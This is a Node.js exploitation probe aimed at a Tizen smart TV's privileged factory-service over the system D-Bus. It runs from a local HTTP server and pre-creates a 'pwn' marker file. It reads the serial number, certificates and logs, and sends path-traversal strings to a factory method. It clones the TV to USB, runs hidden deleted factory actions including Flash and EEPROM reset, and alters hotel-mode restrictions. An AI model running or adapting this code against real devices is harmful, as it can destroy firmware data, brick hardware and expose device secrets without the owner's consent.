'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8189;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe100h.txt';
var PWN = '/tmp/pwn100h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Pre-create pwn file
  'try { fs.writeFileSync("' + PWN + '", "pre\\n"); r.pwn_ok = true; } catch(e) {}',

  // 2. GetQRCodeFiles() — returns a file path string
  'try {',
  '  var o_qr = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetQRCodeFiles"],{timeout:8000});',
  '  r.qr_code_path = (o_qr.stdout||new Buffer(0)).toString().trim().slice(0,300);',
  '} catch(e) { r.qr_code_err = e.message.slice(0,60); }',
  // If a path was returned, try to read it
  'try {',
  '  var qrout = r.qr_code_path || "";',
  '  var qrmatch = qrout.match(/\\/[^\'"\)]+/);',
  '  if (qrmatch) {',
  '    r.qr_file_read = fs.readFileSync(qrmatch[0],"utf8").slice(0,200);',
  '    r.qr_file_stat = fs.statSync(qrmatch[0]).size;',
  '  }',
  '} catch(e) { r.qr_file_err = e.message.slice(0,60); }',

  // 3. GetSerialNo()
  'try {',
  '  var o_sn = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetSerialNo"],{timeout:4000});',
  '  r.serial_no = (o_sn.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',

  // 4. Read /opt/share/logger/ files
  'r.logger_files = {};',
  'var logger_targets = ["LogPolicyConfig.xml","MonitorData.txt","ca.pem","LogPolicyConfig.xml.default"];',
  'logger_targets.forEach(function(f) {',
  '  try { r.logger_files[f] = fs.readFileSync("/opt/share/logger/"+f,"utf8").slice(0,1000); }',
  '  catch(e) { r.logger_files[f] = "ERR:"+e.message.slice(0,50); }',
  '});',

  // 5. Read /opt/var/log/vconf-init.log
  'try { r.vconf_init_log = fs.readFileSync("/opt/var/log/vconf-init.log","utf8").slice(0,2000); }',
  'catch(e) { r.vconf_init_log = "ERR:"+e.message.slice(0,50); }',
  // Try dlog too
  'try {',
  '  var dlog_st = fs.statSync("/opt/var/log/dlog");',
  '  if (dlog_st.isDirectory()) {',
  '    r.dlog_dir = fs.readdirSync("/opt/var/log/dlog").slice(0,20);',
  '  } else {',
  '    r.dlog_content = fs.readFileSync("/opt/var/log/dlog","utf8").slice(0,500);',
  '  }',
  '} catch(e) { r.dlog_err = e.message.slice(0,50); }',

  // 6. GetOptionStringData sweep (1..20) — find other string options
  'r.option_strings = {};',
  'for (var os = 0; os <= 20; os++) {',
  '  try {',
  '    var o_os = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData",String(os)],{timeout:3000});',
  '    var osout = (o_os.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '    if (osout && osout !== "((-1,),)" && osout.indexOf("(1,)") === -1) r.option_strings["k"+os] = osout;',
  '    else if (osout) r.option_strings["k"+os+"_err"] = osout.slice(0,30);',
  '  } catch(e) {}',
  '}',

  // 7. GetItemString(0..20) — string getter for items
  'r.item_strings = {};',
  'for (var is = 0; is <= 20; is++) {',
  '  try {',
  '    var o_is = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItemString",String(is)],{timeout:3000});',
  '    var isout = (o_is.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '    r.item_strings["k"+is] = isout;',
  '  } catch(e) {}',
  '}',

  // 8. GetHotelCountryListNo with path traversal string
  'r.hotel_country_tests = {};',
  'var country_tests = ["US","KR","GB","../../../tmp/pwn100h","../../../../tmp/pwn100h","/tmp/pwn100h"];',
  'country_tests.forEach(function(ct) {',
  '  try {',
  '    var o_hc = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetHotelCountryListNo",ct],{timeout:4000});',
  '    r.hotel_country_tests[ct] = (o_hc.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '  } catch(e) {}',
  '});',

  // 9. FactoryCloneTvToUsb() — clone TV to USB, capture dmesg
  'var dm_base = 0;',
  'try { dm_base = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n").length; } catch(e) {}',
  'try {',
  '  var o_ctu = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.FactoryCloneTvToUsb"],{timeout:12000});',
  '  r.clone_tv_to_usb = (o_ctu.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.clone_tv_to_usb_err = e.message.slice(0,60); }',
  'try {',
  '  var dm_ctu = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n");',
  '  r.clone_tv_usb_dmesg = dm_ctu.slice(dm_base).join("\\n").slice(0,2000);',
  '  dm_base = dm_ctu.length;',
  '} catch(e) {}',

  // 10. SetParameter + Executes for Deleted items 88-92 (Export/Import/Verify/Flash Reset/EEPROM Reset)
  'r.deleted_upgrade_execs = {};',
  'var del_upgrade_keys = [8806,8906,9006,9106,9206];',
  'var del_upgrade_names = ["Export","Import","Verify","Flash_Reset","Tizen_EEPROM_Reset"];',
  'del_upgrade_keys.forEach(function(duk, dui) {',
  '  try {',
  '    var o_dsp = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter",String(duk),"1"],{timeout:4000});',
  '    var dsp_out = (o_dsp.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '    r.deleted_upgrade_execs[del_upgrade_names[dui]] = { set: dsp_out };',
  '    if (dsp_out.indexOf("(0,)") > -1) {',
  '      var o_dex = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(duk),"0"],{timeout:12000});',
  '      var dex_out = (o_dex.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '      r.deleted_upgrade_execs[del_upgrade_names[dui]].exec = dex_out;',
  '      var dm_new = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n");',
  '      r.deleted_upgrade_execs[del_upgrade_names[dui]].dmesg = dm_new.slice(dm_base).join("\\n").slice(0,500);',
  '      dm_base = dm_new.length;',
  '    }',
  '  } catch(e) {}',
  '});',

  // 11. SetHotelModeInfo — try modifying hotel mode (disable flag [0])
  // Current: [3, 0, 0, 0, 0, 100, 10, 0, 0, 0, 65536, 0, ...86 total]
  // Try setting [0] to 0 (from 3) — might disable hotel mode restrictions
  'try {',
  '  var hm_arr = "uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 100 uint32 10 uint32 0 uint32 0 uint32 0 uint32 65536 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 1 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 3 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 1 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0 uint32 0";',
  '  var o_shm = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetHotelModeInfo","["+hm_arr+"]"],{timeout:5000});',
  '  r.set_hotel_mode = (o_shm.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.set_hotel_mode_err = e.message.slice(0,60); }',
  // Read back hotel mode after change
  'try {',
  '  var o_ghm2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetHotelModeInfo"],{timeout:4000});',
  '  r.hotel_mode_after = (o_ghm2.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) {}',

  // 12. SetParameterAndOpcode for a few keys — test cmd values
  'r.setparam_opcode = {};',
  'var spoc_tests = [[10804,1,1],[10804,1,2],[10804,1,3],[90804,1,1],[8906,1,1]];',
  'spoc_tests.forEach(function(t) {',
  '  try {',
  '    var o_spoc = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameterAndOpcode",String(t[0]),String(t[1]),String(t[2])],{timeout:4000});',
  '    r.setparam_opcode["k"+t[0]+"v"+t[1]+"c"+t[2]] = (o_spoc.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '  } catch(e) {}',
  '});',

  // 13. GetCountryStr(0..10) — country string mappings
  'r.country_strs = {};',
  'for (var cs = 0; cs <= 10; cs++) {',
  '  try {',
  '    var o_cs = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetCountryStr",String(cs)],{timeout:3000});',
  '    r.country_strs["k"+cs] = (o_cs.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 14. /tmp check for any new files
  'try {',
  '  var tmp_now = fs.readdirSync("/tmp");',
  '  r.tmp_new = tmp_now.filter(function(f){',
  '    return f.indexOf("pwn")>-1||f.indexOf("qr")>-1||f.indexOf("clone")>-1||f.indexOf("factory")>-1||f.indexOf("export")>-1||f.indexOf("import")>-1;',
  '  });',
  '} catch(e) {}',

  // 15. pwn + dmesg tail
  'try {',
  '  var dm_fin = cp.spawnSync("dmesg",[],{timeout:3000});',
  '  r.dmesg_tail15 = (dm_fin.stdout||new Buffer(0)).toString().split("\\n").slice(-15).join("\\n").slice(0,1000);',
  '} catch(e) {}',
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
